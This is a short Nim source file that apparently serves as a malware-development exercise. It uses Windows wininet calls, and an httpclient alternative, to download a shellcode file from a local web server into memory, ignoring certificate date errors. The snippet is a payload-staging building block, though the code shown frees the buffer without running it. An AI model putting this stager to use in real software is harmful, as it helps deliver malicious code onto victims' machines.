import std/httpclient
import winim/lean
import winim/inc/wininet

proc GetPayload(url: string, size: uint): bool =
    result = true
    let hInternet: HINTERNET = InternetOpenW(NULL, 0, NULL, NULL, 0)
    defer: hInternet.InternetCloseHandle()
    if hInternet == NULL:
        echo "[!] - Unable to get internet handle. Error: ", GetLastError()
        return false
    echo "[+] - Accquired internet handle"
    let pBytes = cast[PBYTE](LocalAlloc(LPTR, cast[SIZE_T](size))) 
    let hInternetFile: HINTERNET = InternetOpenUrlW(
            hInternet, 
            url.winstrConverterStringToLPWSTR, 
            NULL, 
            0, 
            INTERNET_FLAG_HYPERLINK or INTERNET_FLAG_IGNORE_CERT_DATE_INVALID,
            0)
    defer: 
        hInternetFile.InternetCloseHandle()
        InternetSetOptionW(NULL, INTERNET_OPTION_SETTINGS_CHANGED, NULL, 0)
        discard LocalFree(cast[HLOCAL](pBytes))
    
    if hInternetFile == NULL:
        echo "[!] - Unable to get internet file handle. Error: ", GetLastError()
        return false
    
    var dwBytesRead: DWORD
    result = InternetReadFile(hInternetFile, pBytes, cast[DWORD](size), addr dwBytesRead)
    if not result:
        echo "[!] - Failed to read from remote file. Error: ", GetLastError()
    
    echo "[+] - Read ", size, " bytes from ", url

proc GetPayloadIdiomatic(url: string): bool =
    var client = newHttpClient()
    let data = client.getContent(url)
    true

if isMainModule:
    discard GetPayload("http://localhost:8000/tests/shellcode.bin", 666)
